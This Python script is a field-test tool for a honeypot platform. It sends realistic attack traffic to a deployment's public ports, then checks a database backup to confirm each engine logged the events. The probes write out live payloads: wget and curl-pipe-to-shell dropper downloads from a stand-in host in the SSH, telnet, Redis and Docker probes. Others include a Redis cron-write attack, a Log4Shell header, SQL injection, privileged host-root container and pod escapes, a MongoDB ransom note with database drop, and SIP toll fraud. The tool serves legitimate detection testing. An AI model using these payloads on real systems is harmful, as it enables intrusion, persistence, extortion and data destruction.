# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "redis", "pymongo", "pymysql", "paramiko", "httpx", "impacket", "ldap3", "asyncpg",
# ]
# ///
"""Field test: attack every deployed honeypot the way a real client would, then prove the
platform recorded it.

    # 1. From a machine that is NOT the VPS, against the VPS's public address:
    uv run scripts/field_test.py attack --host 203.0.113.7 --out field-run.json

    # 2. Pull a backup (scripts/fetch_backup.sh), then check what was recorded:
    uv run scripts/field_test.py verify --manifest field-run.json \
        --db ~/hp-backups/<backup>/honeypot_mcp.db --report field-report.md

`attack` talks to the same public ports a scanner would use, with real client libraries
(paramiko, redis-py, pymongo, pymysql, asyncpg, impacket, ldap3, httpx) and raw sockets where
the protocol is simple. It records, per probe, what it did and which event types the platform
is expected to raise. `verify` reads the downloaded database and checks every expectation
against rows from *this machine's* source address after the run started: the evidence that the
whole path (public port -> firewall -> engine -> event buffer -> database) works per engine.

Nothing here attacks anything but the host you name. The payloads are inert: they are captured
by the honeypots and never reach a real service (Cowrie's egress is closed, the Docker/
Kubernetes/Redis engines do not execute anything). Run it only against your own deployment.
"""

from __future__ import annotations

import argparse
import contextlib
import json
import os
import socket
import sqlite3
import struct
import subprocess
import sys
import time
import urllib.request
from collections.abc import Callable
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime

# Public ports as a scanner sees them (see docs/HARDENING.md for the DNAT map).
PORTS = {
    "ssh": 22,
    "telnet": 23,
    "http": 80,
    "ftp": 21,
    "pop3": 110,
    "imap": 143,
    "ldap": 389,
    "smb": 445,
    "rsync": 873,
    "rdp": 3389,
    "vnc": 5900,
    "redis": 6379,
    "mysql": 3306,
    "elasticsearch": 9200,
    "postgresql": 5432,
    "mongodb": 27017,
    "mssql": 1433,
    "memcached": 11211,
    "docker_api": 2375,
    "kubernetes": 6443,
    "nfs": 2049,
    "sip": 5060,
    "snmp": 161,
}
TIMEOUT = 8.0
PASSWORD = "fieldtest-hunter2"


@dataclass
class Probe:
    engine: str
    name: str
    expect_any: list[str]  # at least one of these event types must be recorded
    expect_all: list[str] = field(default_factory=list)
    ok: bool = False  # the client call itself ran
    note: str = ""
    started: str = ""


def _tcp(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port), timeout=TIMEOUT)
    s.settimeout(TIMEOUT)
    return s


def _recv(s: socket.socket, n: int = 4096) -> bytes:
    try:
        return s.recv(n)
    except OSError:
        return b""


# ----------------------------------------------------------------------------- probes


def p_ssh_login(host: str) -> str:
    import paramiko

    out = []

    def connect(password: str) -> paramiko.SSHClient:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            host,
            PORTS["ssh"],
            "root",
            password,
            timeout=TIMEOUT,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=TIMEOUT,
        )
        return c

    try:  # Cowrie refuses this password and accepts the next one
        connect("root").close()
        out.append("password 'root' accepted")
    except paramiko.AuthenticationException:
        out.append("password 'root' refused")

    c = connect(PASSWORD)  # interactive shell: what most botnets do
    try:
        shell = c.invoke_shell()
        time.sleep(1)
        for line in (
            "uname -a",
            "cat /etc/passwd",
            "cd /tmp; wget http://198.51.100.9/bins.sh -O .x; chmod +x .x; ./.x",
        ):
            shell.send(line + "\n")
            time.sleep(1.5)
        out.append("shell session with 3 commands")
    finally:
        c.close()

    c = connect(PASSWORD)  # exec request (`ssh host cmd`)
    try:
        c.exec_command("id", timeout=TIMEOUT)
        out.append("exec ok")
    except paramiko.SSHException as e:
        # Cowrie closes the channel before answering the request, which paramiko (stricter than
        # OpenSSH, whose client gets the output) reports as an error. The command is still recorded.
        out.append(f"exec: paramiko says {e}")
    finally:
        c.close()
    return "; ".join(out)


def p_telnet(host: str) -> str:
    s = _tcp(host, PORTS["telnet"])
    _recv(s)
    for line in (
        b"root",
        PASSWORD.encode(),
        b"uname -a",
        b"wget http://198.51.100.9/m.sh",
        b"exit",
    ):
        s.sendall(line + b"\r\n")
        time.sleep(0.6)
        _recv(s)
    s.close()
    return "session with login and commands"


def p_http(host: str) -> str:
    import httpx

    base = f"http://{host}:{PORTS['http']}"
    with httpx.Client(timeout=TIMEOUT, follow_redirects=False) as c:
        got = [
            c.get(base + p).status_code
            for p in ("/", "/robots.txt", "/.env", "/admin/", "/wp-login.php")
        ]
        c.post(base + "/admin/login", data={"username": "admin", "password": PASSWORD})
        c.get(base + "/", headers={"User-Agent": "${jndi:ldap://198.51.100.9:1389/a}"})
        c.get(base + "/?id=1'%20OR%20'1'='1")
        c.get(base + "/cgi-bin/../../../../etc/passwd")
    return f"status codes {got}"


def p_ftp(host: str) -> str:
    import ftplib

    n = []
    f = ftplib.FTP()
    f.connect(host, PORTS["ftp"], timeout=TIMEOUT)
    try:
        f.login("anonymous", "field@test.invalid")
        n.append("anonymous ok")
        with contextlib.suppress(*ftplib.all_errors):
            f.retrlines("LIST")
        import io

        with contextlib.suppress(*ftplib.all_errors):
            f.storbinary("STOR fieldtest.txt", io.BytesIO(b"hello"))
    except ftplib.all_errors as e:
        n.append(f"anonymous: {e}")
    finally:
        with contextlib.suppress(Exception):
            f.close()
    g = ftplib.FTP()
    g.connect(host, PORTS["ftp"], timeout=TIMEOUT)
    with contextlib.suppress(*ftplib.all_errors):
        g.login("admin", PASSWORD)
    with contextlib.suppress(Exception):
        g.close()
    return "; ".join(n)


def p_pop3(host: str) -> str:
    import poplib

    p = poplib.POP3(host, PORTS["pop3"], timeout=TIMEOUT)
    with contextlib.suppress(poplib.error_proto):
        p.user("admin")
        p.pass_(PASSWORD)
    with contextlib.suppress(Exception):
        p.quit()
    return "USER/PASS"


def p_imap(host: str) -> str:
    import imaplib

    m = imaplib.IMAP4(host, PORTS["imap"], timeout=TIMEOUT)
    with contextlib.suppress(imaplib.IMAP4.error):
        m.login("admin", PASSWORD)
    with contextlib.suppress(Exception):
        m.logout()
    return "LOGIN"


def p_ldap(host: str) -> str:
    from ldap3 import ANONYMOUS, Connection, Server

    srv = Server(host, PORTS["ldap"], get_info=None, connect_timeout=int(TIMEOUT))
    c = Connection(
        srv, user="cn=admin,dc=corp,dc=local", password=PASSWORD, receive_timeout=int(TIMEOUT)
    )
    c.bind()
    c.unbind()
    a = Connection(srv, authentication=ANONYMOUS, receive_timeout=int(TIMEOUT))
    a.bind()
    with contextlib.suppress(Exception):
        a.search("", "(objectClass=*)", search_scope="BASE", attributes=["namingContexts"])
    with contextlib.suppress(Exception):
        a.search("dc=corp,dc=local", "(objectClass=user)", attributes=["sAMAccountName"])
    with contextlib.suppress(Exception):  # Log4Shell second stage: opaque base object
        a.search(
            "a1B2c3D4",
            "(objectClass=*)",
            search_scope="BASE",
            attributes=["javaClassName", "javaCodeBase"],
        )
    a.unbind()
    return "simple bind, anonymous rootDSE, subtree search, JNDI-style search"


def p_smb(host: str) -> str:
    from impacket.smbconnection import SessionError, SMBConnection

    c = SMBConnection(host, host, sess_port=PORTS["smb"], timeout=TIMEOUT)
    with contextlib.suppress(SessionError):
        c.login("administrator", PASSWORD, "WORKGROUP")
    with contextlib.suppress(Exception):
        c.close()
    return "SMB2 negotiate + NTLM session setup"


def p_rsync(host: str) -> str:
    r = subprocess.run(
        ["rsync", f"rsync://{host}:{PORTS['rsync']}/"], capture_output=True, text=True, timeout=30
    )
    first = (r.stdout.splitlines() or [""])[0]
    for module in [ln.split()[0] for ln in r.stdout.splitlines() if ln.strip()][:2]:
        # The honeypot records the request and sends no file list, so a real client waits for one:
        # that is a fidelity gap (see KNOWN_LIMITATIONS), not a recording failure.
        with contextlib.suppress(subprocess.TimeoutExpired):
            subprocess.run(
                ["rsync", "-rn", f"rsync://{host}:{PORTS['rsync']}/{module}/"],
                capture_output=True,
                text=True,
                timeout=10,
            )
    return f"module list: {first!r}"


def _ber(tag: int, body: bytes) -> bytes:
    n = len(body)
    ln = bytes([n]) if n < 128 else bytes([0x81, n]) if n < 256 else bytes([0x82, n >> 8, n & 255])
    return bytes([tag]) + ln + body


def _snmp(
    community: bytes, pdu_tag: int, req_id: int, a: int, b: int, oid: bytes, value: bytes
) -> bytes:
    vb = _ber(0x30, _ber(0x30, _ber(6, oid) + value))
    pdu = _ber(pdu_tag, _ber(2, bytes([req_id])) + _ber(2, bytes([a])) + _ber(2, bytes([b])) + vb)
    return _ber(0x30, _ber(2, b"\x01") + _ber(4, community) + pdu)  # v2c


def p_snmp(host: str) -> str:
    sysdescr = bytes([0x2B, 6, 1, 2, 1, 1, 1, 0])
    null = b"\x05\x00"
    pkts = [
        _snmp(b"public", 0xA0, 1, 0, 0, sysdescr, null),  # get, default community
        _snmp(b"hunter2", 0xA0, 2, 0, 0, sysdescr, null),  # wrong community
        _snmp(b"public", 0xA5, 3, 0, 10, sysdescr, null),  # getbulk
        _snmp(b"private", 0xA3, 4, 0, 0, sysdescr, _ber(4, b"pwned")),  # set
    ]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    got = 0
    for p in pkts:
        s.sendto(p, (host, PORTS["snmp"]))
        try:
            s.recvfrom(4096)
            got += 1
        except OSError:
            pass
    s.close()
    return f"{got}/4 requests answered"


def p_rdp(host: str) -> str:
    cookie = b"Cookie: mstshash=fieldtest\r\n"
    neg = struct.pack("<BBHI", 1, 0, 8, 3)  # RDP_NEG_REQ: TLS | CredSSP
    x224 = bytes([6 + len(cookie) + len(neg), 0xE0, 0, 0, 0, 0, 0]) + cookie + neg
    tpkt = struct.pack(">BBH", 3, 0, 4 + len(x224)) + x224
    s = _tcp(host, PORTS["rdp"])
    s.sendall(tpkt)
    resp = _recv(s)
    s.close()
    return f"X.224 confirm: {len(resp)} bytes"


def p_vnc(host: str) -> str:
    s = _tcp(host, PORTS["vnc"])
    banner = _recv(s, 12)
    s.sendall(b"RFB 003.008\n")
    _recv(s)
    s.sendall(bytes([2]))  # VNC authentication
    challenge = _recv(s, 16)
    s.sendall(os.urandom(16))
    _recv(s)
    s.close()
    return f"{banner!r}, {len(challenge)}-byte challenge answered"


def p_mysql(host: str) -> str:
    import pymysql

    with contextlib.suppress(pymysql.err.Error):
        pymysql.connect(
            host=host,
            port=PORTS["mysql"],
            user="root",
            password=PASSWORD,
            connect_timeout=int(TIMEOUT),
            ssl_disabled=True,
        )
    return "native-password login (scramble captured)"


def p_postgresql(host: str) -> str:
    import asyncio

    import asyncpg

    async def go() -> None:
        with contextlib.suppress(Exception):
            await asyncio.wait_for(
                asyncpg.connect(
                    host=host,
                    port=PORTS["postgresql"],
                    user="postgres",
                    password=PASSWORD,
                    database="postgres",
                    ssl=False,
                ),
                TIMEOUT,
            )

    asyncio.run(go())
    return "startup + cleartext password"


def p_mssql(host: str) -> str:
    from impacket import tds

    ms = tds.MSSQL(host, PORTS["mssql"])
    with contextlib.suppress(Exception):
        ms.connect()
        ms.login("master", "sa", PASSWORD)
    with contextlib.suppress(Exception):
        ms.disconnect()
    return "TDS PRELOGIN + Login7 as sa"


def p_mongodb(host: str) -> str:
    import pymongo

    c = pymongo.MongoClient(
        host,
        PORTS["mongodb"],
        serverSelectionTimeoutMS=int(TIMEOUT * 1000),
        directConnection=True,
        appname="fieldtest",
    )
    done = []
    with contextlib.suppress(Exception):
        c.list_database_names()
        done.append("listDatabases")
    with contextlib.suppress(Exception):
        c["READ_ME_TO_RECOVER"]["note"].insert_one(
            {
                "msg": "All your data was backed up. Send 0.05 bitcoin to bc1qfieldtest to recover it."
            }
        )
        done.append("ransom-note insert")
    with contextlib.suppress(Exception):
        c.drop_database("fieldtest_victim")
        done.append("dropDatabase")
    c.close()
    return ", ".join(done)


def p_redis(host: str) -> str:
    import redis

    r = redis.Redis(host, PORTS["redis"], socket_timeout=TIMEOUT, decode_responses=True)
    done = []
    for name, fn in (
        ("PING", lambda: r.ping()),
        ("AUTH", lambda: r.execute_command("AUTH", PASSWORD)),
        ("CONFIG SET dir", lambda: r.config_set("dir", "/var/spool/cron")),
        ("CONFIG SET dbfilename", lambda: r.config_set("dbfilename", "root")),
        ("SET crontab", lambda: r.set("x", "\n* * * * * curl http://198.51.100.9/r|sh\n")),
        ("EVAL", lambda: r.eval("return 1", 0)),
        ("MODULE LOAD", lambda: r.execute_command("MODULE", "LOAD", "/tmp/x.so")),
    ):
        with contextlib.suppress(Exception):
            fn()
            done.append(name)
    return ", ".join(done)


def p_elasticsearch(host: str) -> str:
    import httpx

    base = f"http://{host}:{PORTS['elasticsearch']}"
    with httpx.Client(timeout=TIMEOUT) as c:
        codes = [
            c.get(base + p).status_code
            for p in ("/", "/_cat/indices", "/_search?q=password", "/_all/_search", "/_nodes")
        ]
    return f"status codes {codes}"


def p_memcached(host: str) -> str:
    s = _tcp(host, PORTS["memcached"])
    s.sendall(b"stats\r\n")
    got = _recv(s)
    blob = b"A" * 200_000
    s.sendall(b"set fieldtest 0 0 %d\r\n" % len(blob) + blob + b"\r\n")
    _recv(s)
    s.sendall(b"get fieldtest\r\n")
    time.sleep(0.5)
    _recv(s, 65536)
    s.sendall(b"flush_all\r\n")
    _recv(s)
    s.close()
    return f"stats {len(got)} bytes; staged and fetched a 200 kB value"


def p_docker(host: str) -> str:
    import httpx

    base = f"http://{host}:{PORTS['docker_api']}"
    body = {
        "Image": "alpine",
        "Cmd": ["chroot", "/mnt", "sh", "-c", "curl http://198.51.100.9/x|sh"],
        "HostConfig": {"Binds": ["/:/mnt"], "Privileged": True, "PidMode": "host"},
    }
    with httpx.Client(timeout=TIMEOUT) as c:
        codes = [
            c.get(base + "/version").status_code,
            c.get(base + "/containers/json").status_code,
            c.get(base + "/images/json").status_code,
        ]
        codes.append(
            c.post(base + "/images/create", params={"fromImage": "xmrig/xmrig"}).status_code
        )
        r = c.post(base + "/containers/create", json=body)
        codes.append(r.status_code)
        cid = ""
        with contextlib.suppress(Exception):
            cid = r.json().get("Id", "")
        if cid:
            codes.append(c.post(f"{base}/containers/{cid}/start").status_code)
            codes.append(
                c.post(
                    f"{base}/containers/{cid}/exec",
                    json={"Cmd": ["sh", "-c", "id"], "AttachStdout": True},
                ).status_code
            )
    return f"status codes {codes}"


def p_kubernetes(host: str) -> str:
    import httpx

    base = f"https://{host}:{PORTS['kubernetes']}"
    pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": "fieldtest"},
        "spec": {
            "hostPID": True,
            "containers": [
                {
                    "name": "x",
                    "image": "alpine",
                    "securityContext": {"privileged": True},
                    "volumeMounts": [{"name": "h", "mountPath": "/host"}],
                }
            ],
            "volumes": [{"name": "h", "hostPath": {"path": "/"}}],
        },
    }
    with httpx.Client(timeout=TIMEOUT, verify=False) as c:
        codes = [
            c.get(base + p).status_code
            for p in (
                "/version",
                "/api/v1/namespaces",
                "/api/v1/pods",
                "/api/v1/secrets",
                "/api/v1/namespaces/kube-system/secrets",
                "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
            )
        ]
        codes.append(c.post(base + "/api/v1/namespaces/default/pods", json=pod).status_code)
        codes.append(c.post(base + "/api/v1/namespaces/default/pods/fieldtest/exec").status_code)
    return f"status codes {codes}"


def p_sip(host: str) -> str:
    port = PORTS["sip"]

    def msg(method: str, uri: str, ua: str, extra: str = "") -> bytes:
        return (
            f"{method} {uri} SIP/2.0\r\nVia: SIP/2.0/UDP 198.51.100.9:5060;branch=z9hG4bKfield\r\n"
            f"From: <sip:100@{host}>;tag=1\r\nTo: <sip:100@{host}>\r\nCall-ID: field-{method}@x\r\n"
            f"CSeq: 1 {method}\r\nMax-Forwards: 70\r\nUser-Agent: {ua}\r\n{extra}"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

    auth = (
        'Authorization: Digest username="100", realm="asterisk", nonce="fieldtest", '
        f'uri="sip:{host}", response="0123456789abcdef0123456789abcdef"\r\n'
    )
    contact = "Contact: <sip:100@198.51.100.9>\r\n"
    pkts = [
        msg("OPTIONS", f"sip:{host}", "friendly-scanner"),
        msg("REGISTER", f"sip:{host}", "sipcli", contact),  # bare: extension enumeration
        msg("REGISTER", f"sip:{host}", "sipcli", contact + auth),  # with a digest: a login attempt
        msg("INVITE", f"sip:0088212345678@{host}", "sipcli", contact),
    ]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    got = 0
    for p in pkts:
        s.sendto(p, (host, port))
        try:
            s.recvfrom(8192)
            got += 1
        except OSError:
            pass
    s.close()
    return f"UDP: {got}/4 answered (OPTIONS sweep, bare + digest REGISTER, premium-prefix INVITE)"


def _rpc(prog: int, vers: int, proc: int, xid: int) -> bytes:
    call = struct.pack(">IIIIIIIIII", xid, 0, 2, prog, vers, proc, 0, 0, 0, 0)
    return struct.pack(">I", 0x80000000 | len(call)) + call


def p_nfs(host: str) -> str:
    out = []
    for label, frame in (
        ("MOUNT EXPORT", _rpc(100005, 3, 5, 0x11)),
        ("PORTMAP DUMP", _rpc(100000, 2, 4, 0x12)),
    ):
        s = _tcp(host, PORTS["nfs"])
        s.sendall(frame)
        out.append(f"{label}: {len(_recv(s, 8192))} bytes")
        s.close()
    return "; ".join(out)


def p_kubectl(host: str) -> str:
    r = subprocess.run(
        [
            "kubectl",
            "--server",
            f"https://{host}:{PORTS['kubernetes']}",
            "--insecure-skip-tls-verify",
            "--token=fieldtest-token",
            "--request-timeout=10s",
            "get",
            "pods",
            "-A",
        ],
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,  # without a credential kubectl would prompt for one
        timeout=40,
    )
    return (r.stdout.splitlines() or r.stderr.splitlines() or [""])[0][:100]


PROBES: list[tuple[str, str, list[str], list[str], Callable[[str], str]]] = [
    # engine, name, any-of event types, all-of event types, function
    (
        "ssh",
        "paramiko: refused login, accepted login, commands, dropper download",
        ["ssh_login_success"],
        ["ssh_command_input"],
        p_ssh_login,
    ),
    (
        "telnet",
        "raw telnet: login and commands",
        ["telnet_login_success", "telnet_login_failed"],
        ["telnet_command_input"],
        p_telnet,
    ),
    (
        "http",
        "httpx: recon paths, credential post, Log4Shell, SQLi, traversal",
        ["http_exploit_attempt"],
        ["http_probe", "http_credential_submit"],
        p_http,
    ),
    (
        "ftp",
        "ftplib: anonymous and password login",
        ["ftp_anonymous_login", "ftp_login_attempt"],
        [],
        p_ftp,
    ),
    ("pop3", "poplib USER/PASS", ["pop3_login_attempt", "pop3_auth_attempt"], [], p_pop3),
    ("imap", "imaplib LOGIN", ["imap_login_attempt", "imap_auth_attempt"], [], p_imap),
    (
        "ldap",
        "ldap3: simple bind, anonymous rootDSE, search, JNDI-style search",
        ["ldap_bind_attempt"],
        ["ldap_search"],
        p_ldap,
    ),
    (
        "smb",
        "impacket SMBConnection: SMB2 NTLM",
        ["smb_ntlm_auth", "smb_session_setup"],
        ["smb_negotiate"],
        p_smb,
    ),
    (
        "rsync",
        "rsync client: list modules, request a module",
        ["rsync_module_enumeration"],
        ["rsync_anonymous_access", "rsync_file_request"],
        p_rsync,
    ),
    (
        "snmp",
        "hand-built v2c get/getbulk/set, right and wrong community",
        ["snmp_default_community"],
        ["snmp_community_attempt", "snmp_bulk_request", "snmp_set_request"],
        p_snmp,
    ),
    (
        "rdp",
        "X.224 connection request with mstshash cookie",
        ["rdp_handshake", "rdp_connection"],
        [],
        p_rdp,
    ),
    (
        "vnc",
        "RFB 3.8 handshake and challenge response",
        ["vnc_auth_attempt"],
        ["vnc_handshake"],
        p_vnc,
    ),
    ("mysql", "pymysql native-password login", ["mysql_login_attempt"], [], p_mysql),
    ("postgresql", "asyncpg login", ["postgresql_login_attempt"], [], p_postgresql),
    ("mssql", "impacket TDS login as sa", ["mssql_login_attempt"], [], p_mssql),
    (
        "mongodb",
        "pymongo: listDatabases, ransom-note insert, dropDatabase",
        ["mongodb_ransom_note"],
        ["mongodb_command", "mongodb_destructive"],
        p_mongodb,
    ),
    (
        "redis",
        "redis-py: AUTH, CONFIG SET dir/dbfilename, EVAL, MODULE LOAD",
        ["redis_config_set"],
        ["redis_auth_attempt", "redis_eval", "redis_module_load"],
        p_redis,
    ),
    (
        "elasticsearch",
        "httpx: cluster info, _cat/indices, search, _nodes",
        ["elasticsearch_data_access", "elasticsearch_query_probe"],
        [],
        p_elasticsearch,
    ),
    (
        "memcached",
        "stats, stage a large value, fetch it, flush_all",
        ["memcached_amplification_attempt"],
        ["memcached_stats_probe", "memcached_flush_all"],
        p_memcached,
    ),
    (
        "docker_api",
        "httpx: enumerate, pull miner image, privileged host-root container, exec",
        ["docker_api_container_escape"],
        ["docker_api_enumerate"],
        p_docker,
    ),
    (
        "kubernetes",
        "httpx: enumerate, list secrets, privileged hostPath pod, exec",
        ["kubernetes_pod_escape"],
        ["kubernetes_secret_access", "kubernetes_enumerate"],
        p_kubernetes,
    ),
    ("kubernetes", "kubectl get pods -A (real client)", ["kubernetes_enumerate"], [], p_kubectl),
    (
        "sip",
        "UDP OPTIONS sweep, bare and digest REGISTER, premium-prefix INVITE",
        ["sip_toll_fraud_attempt"],
        ["sip_scan", "sip_extension_probe", "sip_register_attempt"],
        p_sip,
    ),
    (
        "nfs",
        "raw ONC RPC: MOUNT EXPORT and PORTMAP DUMP",
        ["nfs_export_enumeration"],
        ["nfs_portmap_dump"],
        p_nfs,
    ),
]


def public_ip() -> str:
    with urllib.request.urlopen("https://api.ipify.org", timeout=10) as r:  # noqa: S310
        return r.read().decode().strip()


def cmd_attack(a: argparse.Namespace) -> int:
    only = set(a.only.split(",")) if a.only else None
    src = a.source_ip or public_ip()
    started = datetime.now(UTC)
    results: list[Probe] = []
    print(f"attacking {a.host} from {src} (events are matched on this source address)\n")
    for engine, name, any_of, all_of, fn in PROBES:
        if only and engine not in only:
            continue
        p = Probe(engine, name, any_of, all_of, started=datetime.now(UTC).isoformat())
        t0 = time.monotonic()
        try:
            p.note = fn(a.host)
            p.ok = True
        except Exception as e:  # noqa: BLE001 - a probe failing is a result, not a crash
            p.note = f"{type(e).__name__}: {e}"[:200]
        results.append(p)
        print(
            f"  [{'sent' if p.ok else 'FAIL'}] {engine:14} {time.monotonic() - t0:5.1f}s  {p.note[:90]}"
        )
        time.sleep(a.pause)
    manifest = {
        "host": a.host,
        "source_ip": src,
        "started": started.isoformat(),
        "finished": datetime.now(UTC).isoformat(),
        "probes": [asdict(p) for p in results],
    }
    with open(a.out, "w") as f:
        json.dump(manifest, f, indent=2)
    print(
        f"\nmanifest written to {a.out}. Wait ~2 s for the buffer, take a backup, then run `verify`."
    )
    return 0 if all(p.ok for p in results) else 1


def cmd_verify(a: argparse.Namespace) -> int:
    with open(a.manifest) as f:
        m = json.load(f)
    db = sqlite3.connect(f"file:{a.db}?immutable=1", uri=True)
    start = m["started"].replace("T", " ").split("+")[0]
    rows = db.execute(
        "SELECT a.event_type, a.severity, h.type, count(*) FROM alerts a LEFT JOIN honeypots h "
        "ON h.id = a.honeypot_id WHERE a.source_ip = ? AND a.timestamp >= ? "
        "GROUP BY 1, 2, 3",
        (m["source_ip"], start),
    ).fetchall()
    seen: dict[str, set[str]] = {}
    sev: dict[str, str] = {}
    for et, sv, ht, _n in rows:
        seen.setdefault(ht or "?", set()).add(et)
        sev[et] = sv
    lines = [
        "# Field test report\n",
        f"Target `{m['host']}`, attacker `{m['source_ip']}`, run {m['started']} to {m['finished']}.\n",
        "| engine | probe | result | recorded | missing |",
        "|---|---|---|---|---|",
    ]
    failed = 0
    covered = set()
    for p in m["probes"]:
        got = seen.get(p["engine"], set())
        hit_any = [e for e in p["expect_any"] if e in got]
        miss_all = [e for e in p["expect_all"] if e not in got]
        ok = p["ok"] and bool(hit_any) and not miss_all
        failed += not ok
        if ok:
            covered.add(p["engine"])
        shown = ", ".join(
            f"{e} ({sev[e]})" for e in sorted(got & set(p["expect_any"] + p["expect_all"]))
        )
        missing = ", ".join(([] if hit_any else [f"any of {p['expect_any']}"]) + miss_all)
        res = "PASS" if ok else ("CLIENT ERROR" if not p["ok"] else "FAIL")
        lines.append(
            f"| {p['engine']} | {p['name']} | **{res}** | {shown or '-'} | {missing or '-'} |"
        )
        if not p["ok"]:
            lines.append(f"|  | client error: `{p['note']}` | | | |")
    engines = {p["engine"] for p in m["probes"]}
    lines += [
        "",
        f"{len(covered)}/{len(engines)} engines proven end to end; {failed} probe(s) failed.\n",
        "## Everything recorded from the attacker address\n",
        "| sensor | event type | severity |",
        "|---|---|---|",
    ]
    for ht, ets in sorted(seen.items()):
        for et in sorted(ets):
            lines.append(f"| {ht} | {et} | {sev[et]} |")
    text = "\n".join(lines)
    print(text)
    if a.report:
        with open(a.report, "w") as f:
            f.write(text + "\n")
    return 1 if failed else 0


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sub = ap.add_subparsers(dest="cmd", required=True)
    at = sub.add_parser("attack", help="run one probe per engine against a deployed host")
    at.add_argument("--host", required=True)
    at.add_argument("--out", default="field-run.json")
    at.add_argument("--only", help="comma list of engines, e.g. ssh,redis")
    at.add_argument("--source-ip", help="this machine's public address (auto-detected otherwise)")
    at.add_argument("--pause", type=float, default=1.0, help="seconds between probes")
    at.set_defaults(fn=cmd_attack)
    v = sub.add_parser("verify", help="check a backup's database against the manifest")
    v.add_argument("--manifest", required=True)
    v.add_argument("--db", required=True)
    v.add_argument("--report", help="write the markdown report here")
    v.set_defaults(fn=cmd_verify)
    a = ap.parse_args()
    return a.fn(a)


if __name__ == "__main__":
    sys.exit(main())
